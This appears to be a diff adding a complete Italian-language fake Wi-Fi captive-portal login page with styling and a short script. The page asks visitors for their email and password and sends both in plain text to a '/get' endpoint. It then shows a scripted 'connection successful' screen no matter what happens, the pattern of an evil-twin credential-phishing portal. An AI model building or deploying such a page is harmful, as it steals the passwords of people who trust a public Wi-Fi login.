@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8" />
+<title>Login Wi-Fi</title>
+<style>
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    margin: 0; background: #f0f4f8;
+    display: flex; height: 100vh;
+    align-items: center; justify-content: center;
+  }
+  .container {
+    background: white;
+    padding: 2rem 2.5rem;
+    border-radius: 15px;
+    box-shadow: 0 10px 30px rgb(0 0 0 / 0.1);
+    width: 360px;
+    text-align: center;
+  }
+
+  /* Titolo */
+  h1 {
+    font-size: 1.3rem;
+    color: #333;
+    margin-bottom: 1.5rem;
+  }
+
+  /* Logo Wi-Fi stile testo */
+  .logo {
+    font-weight: 700;
+    font-size: 2.8rem;
+    font-family: Arial, sans-serif;
+    color: black;
+    user-select: none;
+    margin-bottom: 1rem;
+    position: relative;
+    display: inline-block;
+  }
+  .logo sup {
+    font-size: 0.8rem;
+    position: absolute;
+    top: 0;
+    right: -25px;
+  }
+
+  input[type="email"],
+  input[type="password"] {
+    width: 100%;
+    padding: 12px 16px;
+    margin: 0.5rem 0 1.2rem;
+    border: 2px solid #ddd;
+    border-radius: 25px;
+    font-size: 1rem;
+    transition: border-color 0.3s;
+  }
+  input[type="email"]:focus,
+  input[type="password"]:focus {
+    outline: none;
+    border-color: #0066ff;
+    box-shadow: 0 0 8px #0066ffaa;
+  }
+  button {
+    background: #0066ff;
+    color: white;
+    border: none;
+    width: 100%;
+    padding: 12px;
+    font-size: 1.2rem;
+    border-radius: 25px;
+    cursor: pointer;
+    transition: background-color 0.3s;
+  }
+  button:hover {
+    background: #004fcc;
+  }
+  .hidden {
+    display: none;
+  }
+
+  /* Loading animation - pallini */
+  .loading-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 1rem;
+  }
+  .loading-text {
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: #333;
+  }
+  .dots {
+    display: flex;
+    gap: 8px;
+  }
+  .dot-loading {
+    width: 14px;
+    height: 14px;
+    background: #0066ff;
+    border-radius: 50%;
+    opacity: 0.3;
+    animation-name: blink;
+    animation-duration: 1.4s;
+    animation-iteration-count: infinite;
+    animation-fill-mode: both;
+  }
+  .dot-loading:nth-child(1) { animation-delay: 0s; }
+  .dot-loading:nth-child(2) { animation-delay: 0.2s; }
+  .dot-loading:nth-child(3) { animation-delay: 0.4s; }
+  @keyframes blink {
+    0%, 80%, 100% { opacity: 0.3; }
+    40% { opacity: 1; }
+  }
+
+  /* Success checkmark */
+  .success-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 1.2rem;
+  }
+  .checkmark {
+    width: 80px;
+    height: 80px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: 6px solid #28a745;
+    position: relative;
+  }
+  .checkmark::after {
+    content: '';
+    position: absolute;
+    width: 24px;
+    height: 12px;
+    border: solid #28a745;
+    border-width: 0 0 6px 6px;
+    transform: rotate(-45deg);
+    top: 26px;
+    left: 22px;
+  }
+  .success-container h2 {
+    color: #28a745;
+    font-size: 1.2rem;
+  }
+</style>
+</head>
+<body>
+
+<!-- Pagina di login -->
+<div class="container" id="login-page">
+  <h1>Accedi alla rete Wi-Fi</h1>
+  <div class="logo">Wi‑Fi<sup>™</sup></div>
+  <form id="login-form">
+    <input type="email" id="email" name="email" placeholder="Email" required />
+    <input type="password" id="password" name="password" placeholder="Password" required />
+    <button type="submit">Registrati / Accedi</button>
+  </form>
+</div>
+
+<!-- Pagina di caricamento -->
+<div class="container hidden" id="loading-page">
+  <div class="loading-container">
+    <div class="loading-text">Connessione in corso...</div>
+    <div class="dots">
+      <div class="dot-loading"></div>
+      <div class="dot-loading"></div>
+      <div class="dot-loading"></div>
+    </div>
+  </div>
+</div>
+
+<!-- Pagina di successo -->
+<div class="container hidden" id="success-page">
+  <div class="success-container">
+    <div class="checkmark"></div>
+    <h2>Connessione effettuata</h2>
+  </div>
+</div>
+
+<script>
+  const loginForm = document.getElementById('login-form');
+  const loginPage = document.getElementById('login-page');
+  const loadingPage = document.getElementById('loading-page');
+  const successPage = document.getElementById('success-page');
+
+  loginForm.addEventListener('submit', e => {
+    e.preventDefault();
+
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    loginPage.classList.add('hidden');
+    loadingPage.classList.remove('hidden');
+
+    const params = new URLSearchParams({ email, password });
+    fetch('/get?' + params.toString()).catch(() => {});
+
+    setTimeout(() => {
+      loadingPage.classList.add('hidden');
+      successPage.classList.remove('hidden');
+    }, 4000);
+  });
+</script>
+
+</body>
+</html>
